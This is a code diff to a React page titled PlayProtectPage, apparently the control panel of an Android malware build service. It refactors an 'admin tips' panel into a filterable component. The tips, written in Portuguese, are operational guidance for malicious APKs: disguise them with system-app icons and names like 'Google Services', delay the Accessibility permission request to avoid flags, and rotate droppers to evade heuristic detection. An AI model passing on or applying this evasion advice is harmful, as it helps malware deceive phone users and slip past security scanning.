@@ -301,33 +301,10 @@ function PlayProtectPage() {
                 </div>
               </div>
 303: 
-304:               {/* Dicas do Admin / Bypass Messages */}
-305:               <div className="md:col-span-2 space-y-4">
-306:                 <div className="osint-panel p-4 border-violet/30 bg-violet/5">
-307:                   <div className="flex gap-3">
-308:                     <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-violet/20 border border-violet/40">
-309:                       <ShieldCheck className="h-4 w-4 text-violet" />
-310:                     </div>
-311:                     <div className="space-y-1">
-312:                       <h4 className="font-mono text-[10px] font-bold uppercase tracking-widest text-violet">Shadow Protocol: Dicas do Admin</h4>
-313:                       <div className="grid gap-3 sm:grid-cols-3">
-314:                         <div className="rounded border border-border/40 bg-background/40 p-2 text-[10px] leading-relaxed text-muted-foreground">
-315:                           <span className="mb-1 block font-bold text-foreground">// Dica #01</span>
-316:                           Use ícones de aplicativos de sistema ou ferramentas nativas (Calculadora, Notas) para maior eficácia social.
-317:                         </div>
-318:                         <div className="rounded border border-border/40 bg-background/40 p-2 text-[10px] leading-relaxed text-muted-foreground">
-319:                           <span className="mb-1 block font-bold text-foreground">// Dica #02</span>
-320:                           Nomes genéricos como "System Update" ou "Google Services" costumam ter taxa de retenção 40% maior.
-321:                         </div>
-322:                         <div className="rounded border border-border/40 bg-background/40 p-2 text-[10px] leading-relaxed text-muted-foreground">
-323:                           <span className="mb-1 block font-bold text-foreground">// Dica #03</span>
-324:                           Para APKs acima de 50MB, certifique-se de que a conexão é estável; builds pesadas podem demorar até 8min.
-325:                         </div>
-326:                       </div>
-327:                     </div>
-328:                   </div>
-329:                 </div>
-330:               </div>
+              {/* Dicas do Admin / Bypass Messages */}
+              <div className="md:col-span-2 space-y-4">
+                <AdminTipsSection />
+              </div>
 
               {/* Jobs Section */}
               <div className="osint-panel flex flex-col p-6">
@@ -421,5 +398,113 @@ function PlayProtectPage() {
         </SidebarInset>
       </div>
     </SidebarProvider>
+  );
+}
+
+function AdminTipsSection() {
+  const [search, setSearch] = useState("");
+  const [category, setCategory] = useState<"all" | "social" | "technical" | "naming">("all");
+
+  const tips = [
+    {
+      id: "01",
+      category: "social",
+      title: "Ícones de Sistema",
+      text: "Use ícones de aplicativos de sistema ou ferramentas nativas (Calculadora, Notas) para maior eficácia social."
+    },
+    {
+      id: "02",
+      category: "naming",
+      title: "Engenharia de Nomes",
+      text: "Nomes genéricos como 'System Update' ou 'Google Services' costumam ter taxa de retenção 40% maior."
+    },
+    {
+      id: "03",
+      category: "technical",
+      title: "Builds Pesadas",
+      text: "Para APKs acima de 50MB, certifique-se de que a conexão é estável; builds pesadas podem demorar até 8min."
+    },
+    {
+      id: "04",
+      category: "social",
+      title: "Permissões Críticas",
+      text: "Solicite permissões sensíveis (Acessibilidade) apenas após o primeiro boot para evitar flags imediatas."
+    },
+    {
+      id: "05",
+      category: "technical",
+      title: "Variação de Dropper",
+      text: "Alterne o tipo de dropper a cada 5 builds para dificultar o reconhecimento de padrão por heurísticas."
+    }
+  ];
+
+  const filteredTips = tips.filter(tip => {
+    const matchesSearch = tip.title.toLowerCase().includes(search.toLowerCase()) || 
+                         tip.text.toLowerCase().includes(search.toLowerCase());
+    const matchesCategory = category === "all" || tip.category === category;
+    return matchesSearch && matchesCategory;
+  });
+
+  return (
+    <div className="osint-panel p-4 border-violet/30 bg-violet/5">
+      <div className="flex flex-col gap-4">
+        <div className="flex items-center justify-between gap-4">
+          <div className="flex items-center gap-3">
+            <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-violet/20 border border-violet/40">
+              <ShieldCheck className="h-4 w-4 text-violet" />
+            </div>
+            <h4 className="font-mono text-[10px] font-bold uppercase tracking-widest text-violet">Shadow Protocol: Dicas do Admin</h4>
+          </div>
+          <div className="flex gap-2">
+            {(["all", "social", "technical", "naming"] as const).map(cat => (
+              <button
+                key={cat}
+                onClick={() => setCategory(cat)}
+                className={`px-2 py-0.5 font-mono text-[8px] uppercase tracking-tighter border transition-colors ${
+                  category === cat 
+                    ? "bg-violet/20 border-violet/50 text-violet" 
+                    : "bg-background/20 border-border/40 text-muted-foreground hover:border-violet/30"
+                }`}
+              >
+                {cat}
+              </button>
+            ))}
+          </div>
+        </div>
+
+        <Input 
+          placeholder="Filtrar diretrizes..."
+          value={search}
+          onChange={(e) => setSearch(e.target.value)}
+          className="h-8 rounded-none border-border/40 bg-background/30 font-mono text-[10px] placeholder:text-muted-foreground/50"
+        />
+
+        <div className="grid gap-3 sm:grid-cols-3">
+          <AnimatePresence mode="popLayout">
+            {filteredTips.map(tip => (
+              <motion.div
+                key={tip.id}
+                initial={{ opacity: 0, scale: 0.95 }}
+                animate={{ opacity: 1, scale: 1 }}
+                exit={{ opacity: 0, scale: 0.95 }}
+                className="rounded border border-border/40 bg-background/40 p-2 text-[10px] leading-relaxed text-muted-foreground"
+              >
+                <div className="flex items-center justify-between mb-1">
+                  <span className="font-bold text-foreground">// Dica #{tip.id}</span>
+                  <span className="text-[8px] uppercase tracking-widest text-violet/60">{tip.category}</span>
+                </div>
+                <div className="mb-1 font-bold text-violet/90 text-[9px] uppercase tracking-wider">{tip.title}</div>
+                {tip.text}
+              </motion.div>
+            ))}
+          </AnimatePresence>
+          {filteredTips.length === 0 && (
+            <div className="sm:col-span-3 py-4 text-center font-mono text-[10px] text-muted-foreground italic">
+              Nenhuma diretriz encontrada para "{search}"
+            </div>
+          )}
+        </div>
+      </div>
+    </div>
   );
 }
